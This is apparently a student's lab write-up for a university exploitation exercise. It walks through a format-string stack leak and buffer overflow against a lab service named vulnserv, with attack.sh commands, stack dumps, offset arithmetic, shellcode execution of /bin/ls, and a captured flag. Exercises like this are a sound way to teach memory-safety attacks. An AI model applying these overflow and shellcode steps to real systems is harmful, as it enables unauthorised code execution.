# Exercise 2, Smashing the stack for fun and profit
## Jakob Udovic, s1049877

https://www.rapidtables.com/convert/number/hex-to-ascii.html  

After feeding the stack with 300 (290) %p-s, I overwrote all data, except the first 5 registers.  %p-s bytes overwrote everything again, 500 "%p "-s crashed the service.  

```
0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x
```

After observing the stack with like 50 %p-s, I found out these could be the frame pointer and return address:  
0x7fffffffec10 0x555555555260

With **231 bytes** long string I have overriten the first return address. We need to remember this number. There is, however, 20 at the end of it, so null bytes will be needed.  

Address looks like this:  
```
0x123456789abc20
```

List/shell code is 33 bytes long.   
231 - 33 = 198   
33 byes means 11 "%p " strings since each one consists of 3 ascii characters, 1 byte each.  

75 - 11 = 64  

So we change attack from `./attack.sh 75 0x123456789abc` to `./attack.sh 64 0x123456789abc 0`  

But address has still 20 at the end. I solve this by shortening the string from 231 bytes to 230. I get the following:  
`./attack.sh 63 0x123456789abc 2`  
Now it's time to use real addresses, I just used 0x123456789abc for easier tracking in terminal..   


0x7ffff7f60070   

```
./attack.sh 63 0x7ffff7f60070 2
```

Candidates for the variable on the stack/frame pointer where our input gets stored by the function `gets()`:  
0x7fffffffec00 (fp1)  
0x7fffffffec68 (fp2)  
0x7fffffffec10 (fp3?)  
0x7ffff7f851f5  
0x7ffff7f851ce  (fp??)
0x7fffffffec50  
0x7ffff7ffdd48 (fp)  
0x7fffffffee50 (fp dont even count anymore)  
0x7fffffffee5e (buffer start?)

Temporary calculation:  
String needs to be 189B.  
`./attack.sh 61 0x123456789abc`  
is the same as  
`./attack.sh 50 0x123456789abc 0`  
since the shell code is 33B long.  

We need to add 1 byte of offset to completely override first return address:  
`./attack.sh 50 0x123456789abc 1`  

Brute forcing did not work:  
./attack.sh 50 0x7fffffffee5e 1  
./attack.sh 50 0x7fffffffec00 1  
./attack.sh 50 0x7fffffffec68 1  
./attack.sh 50 0x7fffffffec10 1  
./attack.sh 50 0x7ffff7f851f5 1 ?  
./attack.sh 50 0x7ffff7f851ce 1    
./attack.sh 50 0x7fffffffec50 1  
./attack.sh 50 0x7ffff7ffdd48 1  
./attack.sh 50 0x7fffffffee50 1  
./attack.sh 50 0x7fffffffee5e 1  
./attack.sh 50  1  
./attack.sh 50  1  

---


By further observing stack and flipping values as in exercise 3 I found:  

Running ./addr.sh for the following values, I got:  
```
declare -a arr=("0x4af8a06910402000" "0xcdbc08904063bae9" "xb2c1e117f0365c00" "0x6bc427b1f25ef6a1" "0x34365f363878bf" "0x6c75762f6e69622f" "0x415000767265736e" "0x2f7273752f3d4854" "0x62732f6c61636f6c" "0x2f7273752f3a6e69" "0x69622f6c61636f6c" "0x732f7273752f3a6e" "0x7273752f3a6e6962" "0x62732f3a6e69622f" "0x6e69622f3a6e69" "0x6574783d4d524554" "0x4944444150006d72" "0x41414141413d474e" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x4141414141414141" "0x69676f6c6f6e2f6e" "0x6e3d52455355006e" "0x57500079646f626f" "0x415f434c002f3d44" "0x53555f6e653d4c4c" "0x4800382d4654552e" "0x4f53002f3d454d4f" "0x3d4449505f544143" "0x41434f5300343034" "0x313d444950505f54" "0x5f5441434f530033" "0x3d4e4f4953524556" "0x342e332e372e31" "0x3d454d414e474f4c" "0x530079646f626f6e" "0x434f535f5441434f" "0x37313d524444414b" "0x2e37322e37312e32" "0x41434f5300333432" "0x4f504b434f535f54" "0x373333313d5452" "0x45505f5441434f53" "0x313d524444415245" "0x37322e37312e3237" "0x434f53003234322e" "0x50524545505f5441" "0x333633333d54524f" "0x762f6e69622f0038" "0x767265736e6c75")
```
```
x86_64/bin/vulnservPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binTERM=xtermPADDING=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn/nologinUSER=nobodyPWD=/LC_ALL=en_US.UTF-8HOME=/SOCAT_PID=404SOCAT_PPID=13SOCAT_VERSION=1.7.3.4LOGNAME=nobodySOCAT_SOCKADDR=172.17.27.243SOCAT_SOCKPORT=1337SOCAT_PEERADDR=172.17.27.242SOCAT_PEERPORT=33638/bin/vulnserv
```


Nicer:  
```
x86_64/bin/vulnserv
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TERM=xterm
PADDING=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn/nologin
USER=nobody
PWD=/
LC_ALL=en_US.UTF-8
HOME=/
SOCAT_PID=404
SOCAT_PPID=13
SOCAT_VERSION=1.7.3.4
LOGNAME=nobody
SOCAT_SOCKADDR=172.17.27.243
SOCAT_SOCKPORT=1337
SOCAT_PEERADDR=172.17.27.242
SOCAT_PEERPORT=33638
/bin/vulnserv
```

I guess I was printing too much since those are environmental variables. I should ignore them... The result is not in here, sadly. But that PADDING value, as well as IPs with ports looked suspicious to me for quite some time (more about that later).  


I went back to the stack, where I tried to print it whole, by feeding it different number of %ps.    
The method of flooding the stack with them and seeing, which address remains the same and therefore finding the location of our unknown variable did not work as in the previous assignment.  

I now printed the whole stack and draw it on piece of paper as well as here:  
```
0x7ffff7ffdac0
0 
0 
0x590 
0 0 0 0 0 0 0 0 0 
0x555555555257 
0x7fffffffec00 
0x555555555247 
0x7fffffffec68 
0x100000000 
0x7fffffffec10 
0x555555555260 
0x1 
0x7ffff7f851f5 
0x7ffff7f851ce 
0x7fffffffec50 
0 
0xf8 
0x7ffff7ffdd48 
0x55555555509e 
0x1 
0x7fffffffee51 
0 
0x7fffffffee5f 
0x7fffffffeea1 
0x7fffffffeeac 
0x7fffffffef07 
0x7fffffffef1b 
0x7fffffffef27 
0x7fffffffef2d 
0x7fffffffef40 
0x7fffffffef47 
0x7fffffffef54 
0x7fffffffef62 
0x7fffffffef78 
0x7fffffffef87 
0x7fffffffefa4 
0x7fffffffefb8 
0x7fffffffefd5 
0 
0x21 
0x7ffff7f68000 
0x10 
0x1f8bfbff 
0x6 
0x1000 
0x11 
0x64 
0x3 
0x555555554040 
0x4 
0x38 
0x5 
0xa 
0x7 
0x7ffff7f69000 
0x8 
0 
0x9 
0x555555555088 
0xb 
0xfffe 
0xc
0xfffe 
0xd 
0xfffe 
0xe 
0xfffe 
0x17
0 
0x19 
0x7fffffffee39 
0x1a 
0 
0x1f 
0x7fffffffefea 
0xf 
0x7fffffffee49 
0
0 
0 
```

On the 15th place is the stack variable, which was suspicious `0x7ffff7ffdac0`. 

After that, for quite some time, there was nothing. I would assume that is because we need some space for buffer.  

The first thing after that (27th place) is a HEAP address. This was weird to me, since I expected something like in 5th assignment of the pattern:  
`stack, stack, heap`  
Which would correspond to:  
`variable, frame pointer, return address`.  
In the whole stack I could not find anything similar to this...   
That's unfortunate since I thoght Thom will make a challenge harder by just nesting some functions to hide the address.  

---

After failing to find the pattern, I thought there could be a canary exploit.  

I tried figuring out how to insert a null byte but soon realized, there are needed 2 separate buffer overflows for that.  

I gave up on the challenge **here** and started writing this report.  

Then I notice I wrote this:  
```
There are first 5 values that are register values, which we normally ignore.  
I mean could the variable location be stored here? Probably not in our case...  
```

Then it hit me. Since I already tried to brute force most of the combinations, a couple more won't hurt?   
So: let's try to use these addresses anyway for the exploit of the first return address/heap address we see.   

Candidates: 0x7ffff7ffc528 and 0x7ffff7ffda40 (non-zero register values)  

First, I tried my dummy `0x123456789ABC` address to easier locate the length of the attack string to overwrite the return address.  
```
./attack.sh 45 0x123456789abc 0
* [DEBUG] ./shellcode printed 33 bytes
Attackstring is 174 bytes
H1�H1�H�//bin/lsH�SH��RWH��;0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0xbb48d23148c03148 0x736c2f6e69622f2f 0xe789485308ebc148 0xf3bb0e689485752 0x2520702520702505 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x123456789abc 0x7fffffffec00 0x555555555247 0x7fffffffec68 0x100000000 0x7fffffffec10 0x555555555260 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48 0x55555555509e 0x1 0x7fffffffee50 0 0x7fffffffee5e ��xV4
```

Turns out, the string should be 174B long.  
Now, I can use my candidates.  

This return address did not work. Let's try find and overwrite the next one: `0x555555555247`.  

This worked with the first candidate aka the address in the first register.  
The process od locating the variable of our input was the same as before, so I will omit it and just paste the result:  

```
./attack.sh 50 0x7ffff7ffc528 1
* [DEBUG] ./shellcode printed 34 bytes
Attackstring is 190 bytes
�H1�H1�H�//bin/lsH�SH��RWH��;0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x48d23148c0314890 0x6c2f6e69622f2fbb 0x89485308ebc14873 0x3bb0e689485752e7 0x207025207025050f 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7ffff7ffc528 0x7fffffffec68 0x100000000 0x7fffffffec10 0x555555555260 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48 0x55555555509e 0x1 0x7fffffffee50 0 0x7fffffffee5e 0x7fffffffeea0 0x7fffffffeeab 0x7fffffffef06 0x7fffffffef1a 0x7fffffffef26 (����
FLAG
bin
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
src
srv
sys
tmp
usr
var
```

As we can see, the code was sucessfully executed! FINALLY! Days of hard work were paid off...  
Now, I just had to change the code from the `list` to `shell` in the script aka utilities, that were kindly provided to us, the same we did for the assignment 5.   


Conclusion: I hate myslef and my thinking process. I could try the dumbest things first and save myself a lot of grey hair and wrinkles.  
I hope at least this writeup is good enough. I do not know what else to say, I dived into trying to connect to a new host when I saw IPs and ports in the environmental variables. I tried to overcome my imaginary canaries. I tried everything.  
The good thing is, it's over and that's what matters.  

Have a nice day. 

--- 

Some calculations on how I was calculating the attack string lengths:
```
285B long string, need 1 more B, so I need nops.  
285B - 6B address = 279B of "%p "  
279 / 3 = 93x "%p "  
279B - 33B (that's an attack string) = 246B  
246 / 3 = 82x "%p "  
```



Flag:  
```
cat /FLAG
HiCCTF{PyiTvuGWCHNbZTz0AwzCPWVAZotbsbW6lOKahkgCykGLRRyzyweJ0PEns7YJvBwH}
```

